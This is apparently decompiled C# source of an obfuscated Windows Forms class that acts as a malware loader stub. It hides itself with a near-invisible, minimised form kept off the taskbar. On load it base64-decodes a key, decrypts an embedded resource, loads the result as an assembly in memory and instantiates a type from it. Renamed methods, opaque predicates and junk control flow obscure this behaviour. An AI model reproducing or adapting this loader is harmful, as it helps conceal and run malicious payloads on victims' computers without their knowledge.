using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nFile.My.Resources;

namespace nFile;

[DesignerGenerated]
public class urwxgd : Form
{
	private IContainer components;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	internal virtual Panel Panel1
	{
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			PaintEventHandler val = new PaintEventHandler(Panel1_Paint);
			if (_Panel1 != null)
			{
				_ = 1;
				if (!LfTDepAxpNngyirPh5())
				{
					Xg7OuB8K19UrhZd9Cv(_Panel1, val);
				}
			}
			_Panel1 = value;
			if (_Panel1 != null)
			{
				((Control)_Panel1).add_Paint(val);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ = 0;
			int num;
			if (rc5LuD2xwgKZrullHn())
			{
				num = 4;
				if (!LfTDepAxpNngyirPh5())
				{
					goto IL_004f;
				}
				goto IL_007b;
			}
			goto IL_008d;
			IL_004f:
			EventHandler eventHandler = default(EventHandler);
			while (true)
			{
				switch (num)
				{
				case 0:
				case 4:
					eventHandler = Button1_Click;
					num = 5;
					if (rc5LuD2xwgKZrullHn())
					{
						continue;
					}
					goto case 5;
				case 5:
					if (_Button1 == null)
					{
						break;
					}
					goto IL_008d;
				case 1:
				case 2:
					goto IL_008d;
				case 6:
					return;
				}
				break;
			}
			goto IL_007b;
			IL_008d:
			((Control)_Button1).remove_Click(eventHandler);
			goto IL_007b;
			IL_007b:
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
				num = 6;
				if (!LfTDepAxpNngyirPh5())
				{
					goto IL_004f;
				}
				goto IL_008d;
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ = 1;
			EventHandler eventHandler = default(EventHandler);
			if (!LfTDepAxpNngyirPh5())
			{
				eventHandler = PictureBox1_Click;
			}
			if (_PictureBox1 != null)
			{
				ahhdkufaX0MvJc3FSC(_PictureBox1, eventHandler);
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).add_Click(eventHandler);
			}
		}
	}

	internal virtual DateTimePicker DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker1 = value;
		}
	}

	public urwxgd()
	{
		rc5LuD2xwgKZrullHn();
		if (!LfTDepAxpNngyirPh5())
		{
			((Form)this).add_Load((EventHandler)Form1_Load);
		}
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (!disposing || components == null)
			{
				return;
			}
			_ = 1;
			if (LfTDepAxpNngyirPh5())
			{
				return;
			}
			if (!LfTDepAxpNngyirPh5())
			{
				switch (2)
				{
				default:
					return;
				case 0:
				case 2:
					break;
				case 1:
				case 3:
					return;
				}
			}
			components.Dispose();
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_044c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0456: Expected O, but got Unknown
		//IL_0457: Unknown result type (might be due to invalid IL or missing references)
		//IL_0461: Expected O, but got Unknown
		//IL_0462: Unknown result type (might be due to invalid IL or missing references)
		//IL_046c: Expected O, but got Unknown
		//IL_046d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0477: Expected O, but got Unknown
		//IL_0478: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Expected O, but got Unknown
		//IL_048c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0496: Expected O, but got Unknown
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a1: Expected O, but got Unknown
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ac: Expected O, but got Unknown
		//IL_050d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0517: Expected O, but got Unknown
		int num = 12;
		if (!LfTDepAxpNngyirPh5())
		{
		}
		ComponentResourceManager componentResourceManager = default(ComponentResourceManager);
		do
		{
			IL_0548:
			switch (num)
			{
			case 20:
			{
				((Control)ProgressBar1).set_TabIndex(2);
				cCodXrNYH5rhNnS810(LFuHZSbFATNvwq01B8(this), bool_0: true);
				Label label = Label1;
				Point point_ = new Point(68, 99);
				w8YuakaxxfHR76uEWO(label, point_);
				((Control)Label1).set_Name("Label1");
				Label label2 = Label1;
				Size size = new Size(39, 13);
				W8ummRH5uEIyWQ7KVA(label2, size);
				goto case 1;
			}
			case 1:
				((Control)Label1).set_TabIndex(1);
				goto case 16;
			case 16:
				Label1.set_Text("Label1");
				goto case 4;
			case 4:
			{
				Button button = Button1;
				Point point_ = new Point(25, 20);
				w8YuakaxxfHR76uEWO(button, point_);
				((Control)Button1).set_Name("Button1");
				Button button2 = Button1;
				Size size = new Size(93, 35);
				W8ummRH5uEIyWQ7KVA(button2, size);
				dGVl0QtHDsXdgajLGc(Button1, 0);
				goto case 17;
			}
			case 17:
			{
				zK3h0mITmJbWheiqYw(Button1, "HG");
				((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
				DateTimePicker dateTimePicker = DateTimePicker1;
				Point point_ = new Point(150, 18);
				((Control)dateTimePicker).set_Location(point_);
				((Control)FI0MJATYmN60dsSolh(this)).set_Name("DateTimePicker1");
				DateTimePicker dateTimePicker2 = DateTimePicker1;
				Size size = new Size(132, 20);
				W8ummRH5uEIyWQ7KVA(dateTimePicker2, size);
				goto case 13;
			}
			case 13:
			{
				((Control)DateTimePicker1).set_TabIndex(6);
				SizeF autoScaleDimensions = new SizeF(6f, 13f);
				((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
				((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
				Size size = new Size(417, 215);
				F8vHIoPIxbJ3hUj1tU(this, size);
				num = 7;
				if (LfTDepAxpNngyirPh5())
				{
				}
				goto IL_0548;
			}
			case 19:
				((Control)U5SOX3lMOP0DLH8fYe(this)).get_Controls().Add((Control)LFuHZSbFATNvwq01B8(this));
				((Control)Panel1).get_Controls().Add((Control)(object)Button1);
				goto case 3;
			case 3:
			{
				Panel panel = Panel1;
				Point point_ = new Point(10, 7);
				w8YuakaxxfHR76uEWO(panel, point_);
				((Control)U5SOX3lMOP0DLH8fYe(this)).set_Name("Panel1");
				Panel panel2 = Panel1;
				Size size = new Size(400, 200);
				((Control)panel2).set_Size(size);
				((Control)Panel1).set_TabIndex(0);
				PictureBox pictureBox = PictureBox1;
				point_ = new Point(125, 72);
				((Control)pictureBox).set_Location(point_);
				goto case 15;
			}
			case 15:
			{
				((Control)PictureBox1).set_Name("PictureBox1");
				PictureBox pictureBox2 = PictureBox1;
				Size size = new Size(100, 50);
				((Control)pictureBox2).set_Size(size);
				PictureBox1.set_TabIndex(5);
				((PictureBox)zC0Mk1mW375pNJm3Af(this)).set_TabStop(false);
				((ButtonBase)CheckBox1).set_AutoSize(true);
				oMDNEqEduN5VD0Ki3a(CheckBox1, bool_0: true);
				((CheckBox)Iidm98ssMnPE0UFySq(this)).set_CheckState((CheckState)1);
				CheckBox checkBox = CheckBox1;
				Point point_ = new Point(295, 105);
				((Control)checkBox).set_Location(point_);
				((Control)CheckBox1).set_Name("CheckBox1");
				object obj = Iidm98ssMnPE0UFySq(this);
				size = new Size(40, 17);
				((Control)obj).set_Size(size);
				((Control)CheckBox1).set_TabIndex(4);
				((ButtonBase)Iidm98ssMnPE0UFySq(this)).set_Text("PK");
				((ButtonBase)Iidm98ssMnPE0UFySq(this)).set_UseVisualStyleBackColor(true);
				goto case 9;
			}
			case 9:
			{
				TextBox textBox = TextBox1;
				Point point_ = new Point(206, 51);
				((Control)textBox).set_Location(point_);
				((Control)TextBox1).set_Name("TextBox1");
				object obj2 = KlIl5jkd6mfxublxRf(this);
				Size size = new Size(132, 20);
				((Control)obj2).set_Size(size);
				((Control)KlIl5jkd6mfxublxRf(this)).set_TabIndex(3);
				ProgressBar progressBar = ProgressBar1;
				point_ = new Point(63, 136);
				w8YuakaxxfHR76uEWO(progressBar, point_);
				((Control)ProgressBar1).set_Name("ProgressBar1");
				ProgressBar progressBar2 = ProgressBar1;
				size = new Size(276, 35);
				((Control)progressBar2).set_Size(size);
				goto case 20;
			}
			case 10:
			case 18:
				break;
			case 14:
				((Control)Panel1).get_Controls().Add((Control)zC0Mk1mW375pNJm3Af(this));
				((ControlCollection)f5SjQfo7sgEISYWNX8(Panel1)).Add((Control)(object)CheckBox1);
				goto case 5;
			case 5:
				((Control)Panel1).get_Controls().Add((Control)(object)TextBox1);
				goto case 0;
			case 0:
				((Control)Panel1).get_Controls().Add((Control)XgHCSB95A50x1oc0HX(this));
				goto case 19;
			case 12:
				componentResourceManager = new ComponentResourceManager(typeof(urwxgd));
				goto case 8;
			case 8:
				Panel1 = new Panel();
				uIiKbynkeYOB2wCShS(this, (object)new PictureBox());
				CheckBox1 = new CheckBox();
				TextBox1 = new TextBox();
				ProgressBar1 = new ProgressBar();
				_ = 1;
				if (LfTDepAxpNngyirPh5())
				{
					break;
				}
				goto case 2;
			case 2:
			case 11:
				Label1 = new Label();
				Button1 = new Button();
				mmZqi3DrGr07qubMrl(this, (object)new DateTimePicker());
				((Control)U5SOX3lMOP0DLH8fYe(this)).SuspendLayout();
				((ISupportInitialize)PictureBox1).BeginInit();
				a5nbmNvgrimdcrYrwN(this);
				goto case 6;
			case 6:
				((Control)Panel1).get_Controls().Add((Control)(object)DateTimePicker1);
				goto case 14;
			case 7:
				((Form)this).set_ControlBox(false);
				((Control)this).get_Controls().Add((Control)U5SOX3lMOP0DLH8fYe(this));
				((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
				((Control)this).set_Name("urwxgd");
				((Form)this).set_Opacity(0.01);
				break;
			default:
				num = 9;
				if (!LfTDepAxpNngyirPh5())
				{
					goto IL_0548;
				}
				goto case 0;
			case 21:
				return;
			}
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_Text("F1");
			((Form)this).set_WindowState((FormWindowState)1);
			((Control)U5SOX3lMOP0DLH8fYe(this)).ResumeLayout(false);
			((Control)Panel1).PerformLayout();
			((ISupportInitialize)PictureBox1).EndInit();
			((Control)this).ResumeLayout(false);
			num = 21;
		}
		while (!LfTDepAxpNngyirPh5());
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			LfTDepAxpNngyirPh5();
			if (rc5LuD2xwgKZrullHn())
			{
				break;
			}
			if (LfTDepAxpNngyirPh5())
			{
				continue;
			}
			switch (1)
			{
			case 5:
			case 6:
				continue;
			case 1:
			case 4:
				Interaction.MsgBox((object)"ˆn*(prA]‚W7P„gTA&:Lvz|ƒk‚*\u008d<:yX,ŽjRPYˆ4-~d\u008d0", (MsgBoxStyle)0, (object)null);
				return;
			case 7:
				return;
			}
			break;
		}
		while (true)
		{
			new decimal(2590610L);
			new decimal(3470L);
			try
			{
			}
			catch (Exception object_)
			{
				qbHB0JZ2ZVtDcKmolq(object_);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Hg1m8f7EPN43()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
		}
		catch (Exception object_)
		{
			qbHB0JZ2ZVtDcKmolq(object_);
			Tk6ExAJgayeDVtratG("J6v85‚l\\zLzQ‡Y‰2GbFtdy)}RSy‰\u008f,nu<pkx=<k");
			ProjectData.ClearProjectError();
		}
	}

	public void start(string key)
	{
		LY8E2ShwnUYUe8FcWs(AppDomain.CurrentDomain.Load((byte[])rl1a89wUuZOKnLJcIy(A6Zl0dQiyDoiEHNcoR(), key)).GetType(s8H926yo1kg12VAW68AqiUWNgcO.ty));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		start(Encoding.Default.GetString(Convert.FromBase64String("RkJwS3pxRlB4eGs=")));
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
	}

	internal static bool rc5LuD2xwgKZrullHn()
	{
		return true;
	}

	internal static bool LfTDepAxpNngyirPh5()
	{
		return false;
	}

	internal static void uIiKbynkeYOB2wCShS(object object_0, object object_1)
	{
		((urwxgd)object_0).PictureBox1 = (PictureBox)object_1;
	}

	internal static void mmZqi3DrGr07qubMrl(object object_0, object object_1)
	{
		((urwxgd)object_0).DateTimePicker1 = (DateTimePicker)object_1;
	}

	internal static object U5SOX3lMOP0DLH8fYe(object object_0)
	{
		return ((urwxgd)object_0).Panel1;
	}

	internal static void a5nbmNvgrimdcrYrwN(object object_0)
	{
		((Control)object_0).SuspendLayout();
	}

	internal static object zC0Mk1mW375pNJm3Af(object object_0)
	{
		return ((urwxgd)object_0).PictureBox1;
	}

	internal static object f5SjQfo7sgEISYWNX8(object object_0)
	{
		return ((Control)object_0).get_Controls();
	}

	internal static object XgHCSB95A50x1oc0HX(object object_0)
	{
		return ((urwxgd)object_0).ProgressBar1;
	}

	internal static object LFuHZSbFATNvwq01B8(object object_0)
	{
		return ((urwxgd)object_0).Label1;
	}

	internal static void w8YuakaxxfHR76uEWO(object object_0, Point point_0)
	{
		((Control)object_0).set_Location(point_0);
	}

	internal static void oMDNEqEduN5VD0Ki3a(object object_0, bool bool_0)
	{
		((CheckBox)object_0).set_Checked(bool_0);
	}

	internal static object Iidm98ssMnPE0UFySq(object object_0)
	{
		return ((urwxgd)object_0).CheckBox1;
	}

	internal static object KlIl5jkd6mfxublxRf(object object_0)
	{
		return ((urwxgd)object_0).TextBox1;
	}

	internal static void cCodXrNYH5rhNnS810(object object_0, bool bool_0)
	{
		((Label)object_0).set_AutoSize(bool_0);
	}

	internal static void W8ummRH5uEIyWQ7KVA(object object_0, Size size_0)
	{
		((Control)object_0).set_Size(size_0);
	}

	internal static void dGVl0QtHDsXdgajLGc(object object_0, int int_0)
	{
		((Control)object_0).set_TabIndex(int_0);
	}

	internal static void zK3h0mITmJbWheiqYw(object object_0, object object_1)
	{
		((ButtonBase)object_0).set_Text((string)object_1);
	}

	internal static object FI0MJATYmN60dsSolh(object object_0)
	{
		return ((urwxgd)object_0).DateTimePicker1;
	}

	internal static void F8vHIoPIxbJ3hUj1tU(object object_0, Size size_0)
	{
		((Form)object_0).set_ClientSize(size_0);
	}

	internal static void Xg7OuB8K19UrhZd9Cv(object object_0, object object_1)
	{
		((Control)object_0).remove_Paint((PaintEventHandler)object_1);
	}

	internal static void ahhdkufaX0MvJc3FSC(object object_0, object object_1)
	{
		((Control)object_0).remove_Click((EventHandler)object_1);
	}

	internal static void qbHB0JZ2ZVtDcKmolq(object object_0)
	{
		ProjectData.SetProjectError((Exception)object_0);
	}

	internal static MsgBoxResult akZqm8OlfG60eAWeth(object object_0, MsgBoxStyle msgBoxStyle_0, object object_1)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		return Interaction.MsgBox(object_0, msgBoxStyle_0, object_1);
	}

	internal static DialogResult Tk6ExAJgayeDVtratG(object object_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show((string)object_0);
	}

	internal static object A6Zl0dQiyDoiEHNcoR()
	{
		return Resources.nFile;
	}

	internal static object rl1a89wUuZOKnLJcIy(object object_0, object object_1)
	{
		return Uv.smethod_0((byte[])object_0, (string)object_1);
	}

	internal static object LY8E2ShwnUYUe8FcWs(Type type_0)
	{
		return Activator.CreateInstance(type_0);
	}
}
